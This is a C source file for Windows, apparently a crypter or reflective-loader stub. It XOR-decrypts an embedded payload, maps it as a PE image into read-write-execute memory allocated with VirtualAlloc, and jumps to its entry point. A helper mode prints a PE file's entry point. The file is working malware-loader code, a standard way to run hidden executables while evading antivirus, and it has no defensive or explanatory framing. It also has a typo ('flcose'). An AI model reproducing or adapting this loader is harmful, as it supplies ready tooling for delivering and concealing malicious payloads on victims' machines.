#include "payload.h"
#include "key.h"
#include <stdlib.h>

#include <stdio.h>

#include "utils.h"
#include "winnt.h"

#include <windows.h>
#include <processthreadsapi.h>
#include <errhandlingapi.h>
#include <memoryapi.h>

void decrypt_inmem(const uint8_t *key, const size_t key_len, uint8_t *payload, const size_t payload_len){
  size_t km=key_len-1;
  //printf("key_len: %lu\n", key_len);
  //printf("payload_len: %lu\n", payload_len);
  for(size_t p=0; p<payload_len; ++p){
    //printf("Using 0x%02x\n", key[p&km]);
    payload[p]^=key[p&km];
    //printf("payload: %c\n", payload[p]);
  }
}

void print_last_error(const char *add_msg) {
  fprintf(stderr, "%s", add_msg);
  DWORD errorcode = GetLastError();
  
  char *msg=NULL;
  if(FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER|FORMAT_MESSAGE_FROM_SYSTEM, NULL, errorcode, 0, (char *) &msg, 0, NULL) == 0 || msg == NULL) {
    fprintf(stderr, "Could not get error message for errorcode %ld\n", errorcode);
    return;
  }

  fprintf(stderr, "[%ld] %s\n", errorcode, msg);

  free(msg);
}

int main(int ac, char *as[]){
  if(ac > 1) {
    if(strcmp(as[1], "get_entrypoint") != 0){
      fprintf(stderr, "Unknown command: \"%s\"\n", as[1]);
      return 1;
    }

    if(ac == 2){
      fprintf(stderr, "Missing file\n");
      return 1;
    }

    FILE* fd =fopen(as[2], "rb");
    if(fd == NULL){
      fprintf(stderr, "Failed to open \"%s\"\n", as[2]);
      return 1;
    }

    fseek(fd, 0, SEEK_END);
    const size_t file_len = ftell(fd);
    fseek(fd, 0, SEEK_SET);

    uint8_t *buf = malloc(sizeof(uint8_t) * file_len);
    if(buf==NULL){
      print_last_error("Failed to allocate buffer for file\n");
      fclose(fd);
      return 1;
    }

    size_t read_bytes =0;
    while(read_bytes < file_len){
      read_bytes+=fread(buf+read_bytes, 1, file_len-read_bytes, fd);
    }

    pe_t *pe=pe_new(buf, file_len);
    if(pe==NULL){
      fprintf(stderr, "Failed reading pe info\n");
      free(buf);
      flcose(fd);
      return 1;
    }

    printf("read exe_info\n");
    printf("magic: %x\n", pe->info.optional_header.opt_header64.Magic);
    printf("addr: %08lx\n", pe->info.optional_header.opt_header64.AddressOfEntryPoint);

    pe_free(pe);
    free(buf);
    fclose(fd);
    return 0;
  }
  
  
  decrypt_inmem(key, key_len, payload, payload_len);

  pe_t *pe=pe_new(payload, payload_len);
  if(pe == NULL){
    return 1;
  }

  printf("checksum: %lx  imagebase: %llx sizeofheaders: %lx sizeofimage: %lx\n", 
    pe->info.optional_header.opt_header64.CheckSum,
    pe->info.optional_header.opt_header64.ImageBase,
    pe->info.optional_header.opt_header64.SizeOfHeaders,
    pe->info.optional_header.opt_header64.SizeOfImage
  );
  
  size_t needed_size = pe_get_len(pe)<<4;
  printf("Allocating %llu (%llx) bytes\n", needed_size, needed_size);
  
  uint8_t *mem = VirtualAlloc(NULL, needed_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  printf("mem baseaddress: %p\n", mem);
  
  if(mem == NULL){
    print_last_error("Failed to allocate mem\n");
    goto error;
  }

  if(!pe_load_into_memory(pe, mem, needed_size)){
    print_last_error("Failed to load pe into mem\n");
    goto error;
  }

  void (*entrypoint)() = (void (*)()) (mem + pe->info.optional_header.opt_header64.AddressOfEntryPoint);

  pe_free(pe);

  char buf[2];
  printf("waiting for input");
  fread(buf, 1, 1, stdin);
    
  printf("jumping...\n");
  entrypoint();
  
  return 0;

error:
  pe_free(pe);
  return 1;
}
